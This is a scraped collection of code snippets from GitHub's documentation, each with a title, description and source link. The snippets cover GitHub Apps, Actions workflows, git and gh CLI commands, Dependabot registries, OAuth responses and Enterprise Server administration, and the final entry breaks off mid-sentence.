JSON (Personal Account) - JavaScript\nDESCRIPTION: This JavaScript snippet populates the 'manifest' input field with a JSON string containing the configuration details for the GitHub App. This includes the app's name, URL, webhook attributes, redirect URL, callback URLs, public setting, default permissions, and default events.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/sharing-github-apps/registering-a-github-app-from-a-manifest.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n<script>\n input = document.getElementById(\"manifest\")\n input.value = JSON.stringify({\n   \"name\": \"Octoapp\",\n   \"url\": \"https://www.example.com\",\n   \"hook_attributes\": {\n     \"url\": \"https://example.com/github/events\",\n   },\n   \"redirect_url\": \"https://example.com/redirect\",\n   \"callback_urls\": [\n     \"https://example.com/callback\"\n   ],\n   \"public\": true,\n   \"default_permissions\": {\n     \"issues\": \"write\",\n     \"checks\": \"write\"\n   },\n   \"default_events\": [\n     \"issues\",\n     \"issue_comment\",\n     \"check_suite\",\n     \"check_run\"\n   ]\n })\n</script>\n```\n\n----------------------------------------\n\nTITLE: Product-based versioning with Liquid\nDESCRIPTION: This JavaScript snippet shows how to use Liquid's `ifversion` tag for product-based versioning in Markdown files. It uses the short product name to conditionally display content.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/versioning-documentation.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n{% raw %}{% ifversion SHORT-PRODUCT-NAME %} ... {% endif %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Using a Single Specific Swift Version\nDESCRIPTION: This snippet configures a job to use a single, specific version of Swift (5.3.3) using the `swift-actions/setup-swift` action. It also includes a step to verify the Swift version using `swift --version`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-swift.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\nsteps:\n  - uses: swift-actions/setup-swift@65540b95f51493d65f5e59e97dcef9629ddf11bf\n    with:\n      swift-version: \"5.3.3\"\n  - name: Get swift version\n    run: swift --version # Swift 5.3.3\n```\n\n----------------------------------------\n\nTITLE: Verifying NES is running using nomad status\nDESCRIPTION: This snippet shows how to verify that the Node Eligibility Service (NES) is running in a GitHub Enterprise Server cluster by checking the status of the `nes` service using the `nomad status` command.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster-nodes-with-node-eligibility-service.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nnomad status nes\n```\n\n----------------------------------------\n\nTITLE: Configure npm registry with GitHub Packages URL\nDESCRIPTION: This shell command configures the npm registry to use the GitHub Packages URL. Replace `NAMESPACE` with the user or organization account that owns the repository. The registry URL is `https://npm.pkg.github.com`.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/package_registry/create-npmrc-owner-step.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n@NAMESPACE:registry=https://npm.pkg.github.com\n```\n\n----------------------------------------\n\nTITLE: Verifying configured remote repositories using Git\nDESCRIPTION: Lists all configured remote repositories, including the newly added 'upstream' remote. This verifies that the 'upstream' remote has been correctly added and points to the desired original repository.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/working-with-forks/configuring-a-remote-repository-for-a-fork.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ngit remote -v\n```\n\n----------------------------------------\n\nTITLE: Concatenating TLS Certificate Chain (Shell)\nDESCRIPTION: This snippet demonstrates how to concatenate a TLS certificate and its associated certificate chain into a single file. The principal certificate (e.g., yourdomain.com.crt) should come first, followed by the certificate bundle (e.g., bundle-certificates.crt). This combined file is then used for configuring TLS on the server. Requires shell access and the `cat` command.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/hardening-security-for-your-enterprise/troubleshooting-tls-errors.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ncat yourdomain.com.crt bundle-certificates.crt > yourdomain.combined.crt\n```\n\n----------------------------------------\n\nTITLE: D3 Treemap Implementation in JavaScript\nDESCRIPTION: This JavaScript code utilizes the D3.js library to create a treemap visualization of language byte frequency. It defines functions for accessing data properties (children, size, color, name) and uses the `d3.layout.treemap` to generate the treemap structure. The `drawTreemap` function handles rendering the visualization within a specified HTML element, taking height, width, element selector and other functions as parameters.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/rendering-data-as-graphs.md#_snippet_13\n\nLANGUAGE: HTML\nCODE:\n```\n<div id=\"byte_freq\"></div>\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar language_bytes = <%= language_byte_count %>\n  var childrenFunction = function(d){return d.elements};\n  var sizeFunction = function(d){return d.count;};\n  var colorFunction = function(d){return Math.floor(Math.random()*20)};\n  var nameFunction = function(d){return d.name;};\n\n  var color = d3.scale.linear()\n              .domain([0,10,15,20])\n              .range([\"grey\",\"green\",\"yellow\",\"red\"]);\n\n  drawTreemap(5000, 2000, '#byte_freq', language_bytes, childrenFunction, nameFunction, sizeFunction, colorFunction, color);\n\n  function drawTreemap(height,width,elementSelector,language_bytes,childrenFunction,nameFunction,sizeFunction,colorFunction,colorScale){\n\n      var treemap = d3.layout.treemap()\n          .children(childrenFunction)\n          .size([width,height])\n          .value(sizeFunction);\n\n      var div = d3.select(elementSelector)\n          .append(\"div\")\n          .style(\"position\",\"relative\")\n          .style(\"width\",width + \"px\")\n          .style(\"height\",height + \"px\");\n\n      div.data(language_bytes).selectAll(\"div\")\n          .data(function(d){return treemap.nodes(d);})\n          .enter()\n          .append(\"div\")\n          .attr(\"class\",\"cell\")\n          .style(\"background\",function(d){ return colorScale(colorFunction(d));})\n          .call(cell)\n          .text(nameFunction);\n  }\n\n  function cell(){\n      this\n          .style(\"left\",function(d){return d.x + \"px\";})\n          .style(\"top\",function(d){return d.y + \"px\";})\n          .style(\"width\",function(d){return d.dx - 1 + \"px\";})\n          .style(\"height\",function(d){return d.dy - 1 + \"px\";});\n  }\n```\n\n----------------------------------------\n\nTITLE: Searching Audit Log for 2FA Non-Compliance - GitHub\nDESCRIPTION: This snippet demonstrates how to search the audit log for events related to users removed from an organization due to non-compliance with the two-factor authentication (2FA) requirement. It provides example search queries for different scenarios, such as finding all removed users, outside collaborators, or users removed from a specific organization. The search uses the `reason:two_factor_requirement_non_compliance` parameter.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-accounts-and-repositories/managing-organizations-in-your-enterprise/requiring-two-factor-authentication-for-an-organization.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nreason:two_factor_requirement_non_compliance\n```\n\nLANGUAGE: text\nCODE:\n```\naction:org.remove_outside_collaborator AND reason:two_factor_requirement_non_compliance\n```\n\nLANGUAGE: text\nCODE:\n```\norg:octo-org AND reason:two_factor_requirement_non_compliance\n```\n\n----------------------------------------\n\nTITLE: Searching by Repository Language\nDESCRIPTION: This example demonstrates how to search for users based on the programming languages used in their repositories with the `language` qualifier.  It can be combined with other qualifiers like `location` or `in:fullname` for more specific searches.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-users.md#_snippet_4\n\nLANGUAGE: none\nCODE:\n```\nlanguage:javascript location:russia\njenny language:javascript in:fullname\n```\n\n----------------------------------------\n\nTITLE: Displaying the GITHUB_TOKEN in a codespace\nDESCRIPTION: This command displays the value of the `GITHUB_TOKEN` environment variable within the codespace.  The token is used for authentication and should be kept secret.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/forwarding-ports-in-your-codespace.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\necho $GITHUB_TOKEN\n```\n\n----------------------------------------\n\nTITLE: Example Access Token Response - JSON\nDESCRIPTION: This code snippet shows an example of an access token response in JSON format when the `Accept: application/json` header is used. It includes the access token, scope, and token type. It's crucial for applications to handle this response to retrieve the access token.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authorizing-oauth-apps.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"access_token\":\"gho_16C7e42F292c6912E7710c838347Ae178B4a\",\n  \"scope\":\"repo,gist\",\n  \"token_type\":\"bearer\"\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Audit Log Entries for an Organization (GraphQL)\nDESCRIPTION: This GraphQL query retrieves the last 5 audit log entries for an enterprise organization, filtering by a specific actor. It requires replacing `<org-name>` with the organization's login and `<user-name>` with the actor's username.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/managing-enterprise-accounts.md#_snippet_3\n\nLANGUAGE: GraphQL\nCODE:\n```\n{\n  organization(login: \"<org-name>\") {\n    auditLog(last: 5, query: \"actor:<user-name>\") {\n      edges {\n        node {\n          ... on AuditEntry {\n# Get Audit Log Entry by 'Action'\n            action\n            actorLogin\n            createdAt\n# User 'Action' was performed on\n           user{\n              name\n                email\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Example Redirect URL with code and state parameters\nDESCRIPTION: This code snippet demonstrates an example of a redirect URL containing both the `code` and `state` parameters. The `state` parameter is included only if it was originally provided in the initial request. The `code` is a temporary code.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/sharing-github-apps/registering-a-github-app-from-a-manifest.md#_snippet_5\n\nLANGUAGE: URL\nCODE:\n```\nhttps://example.com/redirect?code=a180b1a3d263c81bc6441d7b990bae27d4c10679&state=abc123\n```\n\n----------------------------------------\n\nTITLE: Persisting data between jobs in CircleCI\nDESCRIPTION: This snippet shows the CircleCI configuration syntax for persisting data between jobs using `persist_to_workspace` and `attach_workspace`. The `persist_to_workspace` command saves files to a workspace, and `attach_workspace` restores them in another job.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-circleci-to-github-actions.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n- persist_to_workspace:\n    root: workspace\n    paths:\n      - math-homework.txt\n\n...\n\n- attach_workspace:\n    at: /tmp/workspace\n```\n\n----------------------------------------\n\nTITLE: Configuring Composer Repository\nDESCRIPTION: This snippet configures access to a private Composer repository using a username and password. It defines the registry in the `registries` section of the Dependabot configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\nregistries:\n  composer:\n    type: composer-repository\n    url: https://repo.packagist.com/example-company/\n    username: octocat\n    password: ${{secrets.MY_PACKAGIST_PASSWORD}}\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_COMMIT_BRANCH to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_COMMIT_BRANCH` to the GitHub Actions equivalent `${{ github.ref }}`. This variable represents the branch or tag name that triggered the workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_17\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.ref }}\n```\n\n----------------------------------------\n\nTITLE: Device Flow Token Request\nDESCRIPTION: This snippet shows how to send a POST request to request the device and user codes as part of the Device Authorization Grant. It requires a `client_id` as a query parameter.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/generating-a-user-access-token-for-a-github-app.md#_snippet_0\n\nLANGUAGE: HTTP\nCODE:\n```\nPOST {% data variables.product.oauth_host_code %}/login/device/code?client_id=CLIENT_ID\n```\n\n----------------------------------------\n\nTITLE: Force Pushing to Remote (Unsafe)\nDESCRIPTION: This command force-pushes the local branch to the remote repository, potentially overwriting remote changes. Use with caution as it can lead to data loss and conflicts.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/using-git-rebase-on-the-command-line.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngit push origin main --force\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering with `not fpt` check\nDESCRIPTION: This snippet demonstrates conditional rendering with a check for `not fpt` within the `else` block of a GHES version check. It first checks if the GHES version is greater than 2.13.  If not, it then checks if `not fpt` is true and renders \"Charlie\" accordingly.  Finally, \"Delta\" is always rendered if the initial GHES version check fails.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/greater-than.md#_snippet_7\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes > 2.13 %}\n\nAlpha\n\n{% else %}\n\nBravo\n\n{% ifversion not fpt %}\n\nCharlie\n\n{% endif %}\n\nDelta\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Using Variables with gh cli and GraphQL\nDESCRIPTION: This snippet shows how to use variables with the `gh api graphql` command. It defines variables for organization and project number, then uses them in the GraphQL query. It demonstrates passing numeric variables using `-F` and string variables using `-f`.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\nmy_org=\"octo-org\"\nmy_num=5\ngh api graphql -f query='\\n  query($organization: String! $number: Int!){\n    organization(login: $organization){\n      projectV2(number: $number) {\n        id\n      }\n    }\n  }' -f organization=$my_org -F number=$my_num\n```\n\n----------------------------------------\n\nTITLE: Entrypoint script to run webhooks pipeline in TypeScript\nDESCRIPTION: This is the entrypoint script used to execute the webhooks pipeline. The script updates the `src/webhooks/data` directory using the OpenAPI specification. It needs a `GITHUB_TOKEN` set in `.env` file.\nSOURCE: https://github.com/github/docs/blob/main/src/webhooks/README.md#_snippet_2\n\nLANGUAGE: TypeScript\nCODE:\n```\nsrc/webhooks/scripts/sync.ts\n```\n\n----------------------------------------\n\nTITLE: Updating GitHub CLI extension for Bitbucket Server migration in Shell\nDESCRIPTION: This command upgrades the `gh-bbs2gh` extension for the GitHub CLI to the latest version. It ensures that you have the most recent features and bug fixes for migrating from Bitbucket Server to GitHub Enterprise Cloud. It requires the GitHub CLI to be installed and the extension to be already installed.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-from-bitbucket-server-to-github-enterprise-cloud/migrating-repositories-from-bitbucket-server-to-github-enterprise-cloud.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh extension upgrade github/gh-bbs2gh\n```\n\n----------------------------------------\n\nTITLE: Viewing GitHub status using gh status\nDESCRIPTION: This command displays the status of the user's current work on GitHub across all subscribed repositories. It provides a summary of recent activity and relevant information.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/quickstart.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngh status\n```\n\n----------------------------------------\n\nTITLE: Force Pushing Changes\nDESCRIPTION: This command force-pushes the local changes to the remote repository.  The `--force` flag is used to overwrite the remote history. `--mirror` ensures all refs are pushed, even tags and branches.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ngit push --force --mirror origin\n```\n\n----------------------------------------\n\nTITLE: Requesting checks for a commit using git\nDESCRIPTION: This snippet demonstrates how to request checks for a commit by adding the `request-checks: true` trailer to the commit message. It requires Git to be installed and configured. The input is a commit message string, and the output is a commit with checks requested.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/collaborating-on-repositories-with-code-quality-features/about-status-checks.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ git commit -m \"Refactor usability tests\n>\n>\nrequest-checks: true\"\n```\n\n----------------------------------------\n\nTITLE: Sending Copilot References SSE - Typescript\nDESCRIPTION: This code snippet shows how to send a `copilot_references` server-sent event (SSE) to the Copilot platform. This SSE sends a list of references used to generate a response, including the reference type, ID, associated data (file, start, end, content), implicit/explicit indication, and metadata for UI display (name, icon, URL).\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/building-a-copilot-agent-for-your-copilot-extension/configuring-your-copilot-agent-to-communicate-with-the-copilot-platform.md#_snippet_3\n\nLANGUAGE: typescript\nCODE:\n```\n//\nevent: copilot_references\ndata: [{\n    // A string that specifies the type of the reference.\n    \"type\": \"blackbeard.story\",\n    // A string that specifies the ID of the reference.\n    \"id\": \"snippet\",\n    // An optional field where the agent can include any data needed to uniquely identify this reference.\n    \"data\": {\n        \"file\": \"story.go\",\n        \"start\": \"0\",\n        \"end\": \"13\",\n        \"content\": \"func main()...writeStory()...\"\n    },\n    // An optional boolean that indicates if the reference was passed implicitly or explicitly.\n    \"is_implicit\": false,\n    // An optional field for the agent to include any metadata to display in the user's environment. If any of the below required fields are missing, then the reference will not be rendered in the UI.\n    \"metadata\": {\n        \"display_name\": \"Lines 1-13 from story.go\",\n        \"display_icon\": \"icon\",\n        \"display_url\": \"http://blackbeard.com/story/1\",\n\n    }\n}]\n```\n\n----------------------------------------\n\nTITLE: Markdown Next Steps Section Example (Enterprise Account)\nDESCRIPTION: This snippet presents another example of a 'Next steps' section in a Markdown document, specifically tailored for users who have just created an enterprise account. It directs them to a learning path to further configure settings and policies. The example demonstrates linking to relevant resources after the initial task is completed.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/contents-of-a-github-docs-article.md#_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n## Next steps\n\nAfter your enterprise account is created, we recommend learning more about how enterprise accounts work and configuring settings and policies. Follow the \"Get started with your enterprise account\" learning path.\n```\n\n----------------------------------------\n\nTITLE: Removing the pages-server service for a node (ghe-dpages)\nDESCRIPTION: This command removes the pages-server service associated with a specific node from the GitHub Enterprise Server cluster. UUID should be replaced with the UUID of the node.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/replacing-a-cluster-node.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nghe-dpages remove pages-server-UUID\n```\n\n----------------------------------------\n\nTITLE: Watching the progress of a workflow run with gh CLI\nDESCRIPTION: This snippet demonstrates how to watch the progress of a workflow run using the `gh run watch` subcommand.  It displays an interactive menu to select the run.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh run watch\n```\n\n----------------------------------------\n\nTITLE: Listing Service Accounts with gcloud\nDESCRIPTION: This command lists existing service accounts using `gcloud iam service-accounts list`. The output will include the email addresses of the service accounts.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-to-google-kubernetes-engine.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ngcloud iam service-accounts list\n```\n\n----------------------------------------\n\nTITLE: Rebooting the Appliance\nDESCRIPTION: This command reboots the GitHub Enterprise Server appliance to detect the new storage allocation after resizing the user volume disk. The appliance needs to be rebooted to recognize the new storage size.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/updating-the-virtual-machine-and-physical-resources/increasing-storage-capacity.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nsudo reboot\n```\n\n----------------------------------------\n\nTITLE: Initializing Bundler (Shell)\nDESCRIPTION: This command initializes Bundler in the current directory, creating a `Gemfile`. The `Gemfile` is used to specify the project's gem dependencies.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-login-with-github-button-with-a-github-app.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nbundle init\n```\n\n----------------------------------------\n\nTITLE: Setting Yarn Registry URL\nDESCRIPTION: This command sets the Yarn registry URL to a specified private registry. It is an alternative to manually configuring the `.yarnrc` or `.yarnrc.yml` file. Requires Yarn to be installed.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_23\n\nLANGUAGE: Shell\nCODE:\n```\nyarn config set registry <url>\n```\n\n----------------------------------------\n\nTITLE: Adding Remote Origin to Local Git Repository\nDESCRIPTION: Adds a remote origin URL to the local Git repository. This allows pushing local changes to the remote repository on GitHub. Replace `REMOTE-URL` with the actual URL of the GitHub repository.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/adding-locally-hosted-code-to-github.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngit remote add origin REMOTE-URL\n```\n\n----------------------------------------\n\nTITLE: Checking Git Status\nDESCRIPTION: This command displays the current status of the Git repository, showing modified, staged, and untracked files. It helps verify the changes before committing.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-git-on-github-docs.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\ngit status\n```\n\n----------------------------------------\n\nTITLE: Pushing changes with git\nDESCRIPTION: This snippet shows how to push local changes to a remote repository using `git push`. This requires a properly configured Git repository.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/secret-scanning/working-with-secret-scanning-and-push-protection/working-with-push-protection-from-the-command-line.md#_snippet_4\n\nLANGUAGE: text\nCODE:\n```\ngit push\n```\n\n----------------------------------------\n\nTITLE: Markdown Table without Row Headers\nDESCRIPTION: This code snippet shows a basic Markdown table without row headers.  The first column contains data, not headers.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_23\n\nLANGUAGE: markdown\nCODE:\n```\n| Name   | Vocation         |\n| ------ | ---------------- |\n| Mona   | GitHub mascot    |\n| Tom    | Mouse antagonist |\n| Hobbes | Best friend      |\n```\n\n----------------------------------------\n\nTITLE: Generating RSA SSH Key (Alternative)\nDESCRIPTION: This snippet shows an alternative command to generate an RSA SSH key pair if the Ed25519 algorithm is not supported.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nnagiosuser@nagios:~$ ssh-keygen -t rsa -b 4096\n```\n\n----------------------------------------\n\nTITLE: Checking Storage Object Status with `ghe-storage`\nDESCRIPTION: This snippet shows how to check the status of a specific storage object using the `ghe-storage` command-line utility. Replace `OID` with the object's ID.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/monitoring-a-high-availability-configuration.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nghe-storage info OID\n```\n\n----------------------------------------\n\nTITLE: Updating the `help` function in Ruby\nDESCRIPTION: This Ruby function `help` prints the usage instructions for the CLI application, listing the available commands: `login`, `whoami`, and `help`.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\ndef help\n  puts \"usage: app_cli <login | whoami | help>\"\nend\n```\n\n----------------------------------------\n\nTITLE: Triggering Staging Deployment with Empty Commit (Shell)\nDESCRIPTION: This code snippet demonstrates how to trigger a new staging deployment by pushing an empty commit. It is useful when a staging deployment is stalled.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/setting-up-your-environment-to-work-on-github-docs/troubleshooting-your-environment.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit commit --allow-empty -m 'empty commit to redeploy staging'\ngit push\n```\n\n----------------------------------------\n\nTITLE: Web Application Flow Exchange Code Snippet\nDESCRIPTION: Snippet showing how to exchange the code received from the web application flow for an access token. This part is a placeholder for the actual exchange.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/generating-a-user-access-token-for-a-github-app.md#_snippet_4\n\nLANGUAGE: Placeholder\nCODE:\n```\n{% data reusables.apps.web-app-flow-exchange-code %}\n```\n\n----------------------------------------\n\nTITLE: Running Specific Playwright Test Case\nDESCRIPTION: This command runs a specific test case in a file, allowing precise testing of individual scenarios.  It targets the test defined on line 16 of the playwright-rendering.spec.ts file.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/PLAYWRIGHT.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nnpm run playwright-test -- playwright-rendering.spec.ts:16\n```\n\n----------------------------------------\n\nTITLE: Starting an SSH session for your codespace\nDESCRIPTION: This command starts an SSH session for your codespace using the GitHub CLI. If you have multiple codespaces, you will be prompted to select one.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/forwarding-ports-in-your-codespace.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace ssh\n```\n\n----------------------------------------\n\nTITLE: DMCA Agent Contact Information\nDESCRIPTION: This snippet shows the physical mailing address for submitting a DMCA counter notice to GitHub. It is the slowest method for submission.\nSOURCE: https://github.com/github/docs/blob/main/content/site-policy/content-removal-policies/guide-to-submitting-a-dmca-counter-notice.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nGitHub, Inc\nAttn: DMCA Agent\n88 Colin P Kelly Jr St\nSan Francisco, CA. 94107\n```\n\n----------------------------------------\n\nTITLE: Defining Description in qlpack.yml (YAML)\nDESCRIPTION: This snippet shows how to define a human-readable description for a CodeQL pack. This description is displayed on the packaging search page.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_18\n\nLANGUAGE: YAML\nCODE:\n```\ndescription: Human-readable description of the contents of the {% data variables.product.prodname_codeql %} pack.\n```\n\n----------------------------------------\n\nTITLE: Conditional rendering for GHES version less than a value\nDESCRIPTION: This snippet checks if the GHES version is less than the second to last supported version and renders 'condition-g' if it is.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/ifversion.md#_snippet_4\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes < __GHES_SUPPORTED__[-2] %}\ncondition-g\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Reset Repository Template Customizations\nDESCRIPTION: This JSON body is used with a PUT request to the REST API endpoint to reset a repository's subject claim customizations to the default format. It opts out of any organization or repository level customizations.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect.md#_snippet_10\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"use_default\": true\n}\n```\n\n----------------------------------------\n\nTITLE: Listing Recent Workflow Runs using GitHub CLI\nDESCRIPTION: This snippet shows how to list recent workflow runs using the `gh run list` command. It retrieves the last 10 workflow runs by default.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/viewing-workflow-run-history.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngh run list\n```\n\n----------------------------------------\n\nTITLE: Auditing GitLab Pipelines\nDESCRIPTION: This command audits GitLab pipelines to provide a high-level view of all pipelines within a specified GitLab namespace or group. It generates a report summarizing the completeness and complexity of a potential migration using GitHub Actions Importer.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer audit gitlab --output-dir tmp/audit --namespace my-gitlab-namespace\n```\n\n----------------------------------------\n\nTITLE: Installing a GitHub CLI Extension\nDESCRIPTION: This snippet demonstrates how to install a GitHub CLI extension using the `gh extension install` subcommand. The `REPO` parameter should be replaced with the repository URL or the owner and repository name of the extension. Installing from the current directory in development is supported using `.` as the repo parameter.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/using-github-cli-extensions.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh extension install REPO\n```\n\n----------------------------------------\n\nTITLE: Disabling All GITHUB_TOKEN Permissions in YAML\nDESCRIPTION: This YAML snippet shows how to disable all permissions for the GITHUB_TOKEN by setting the permissions key to an empty object. This is useful when the workflow doesn't require any access.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/github-token-available-permissions.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\npermissions: {}\n```\n\n----------------------------------------\n\nTITLE: Stopping GitHub Actions (ghe-actions-stop)\nDESCRIPTION: This command stops GitHub Actions from running on the GitHub Enterprise Server instance. Useful when support asks you to run this command during troubleshooting.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_70\n\nLANGUAGE: shell\nCODE:\n```\nghe-actions-stop\n```\n\n----------------------------------------\n\nTITLE: Installing gems defined in Gemfile\nDESCRIPTION: This command installs the gems (libraries) that are defined in the Gemfile. It creates a Gemfile.lock to ensure consistent gem versions across different environments.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/using-webhooks/handling-webhook-deliveries.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbundle install\n```\n\n----------------------------------------\n\nTITLE: Allowing External Code Execution in Updates - YAML\nDESCRIPTION: This code snippet shows how to allow limited external code execution for a specific registry using the `insecure-external-code-execution` setting. This is useful when the package manager requires external code execution during updates, but it restricts access to only the specified registry to prevent security risks. This setting should only be used when strictly necessary as it can increase security vulnerabilities.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n\n```\n\n----------------------------------------\n\nTITLE: Filtering 'push' event by branch - YAML\nDESCRIPTION: This snippet configures a GitHub Actions 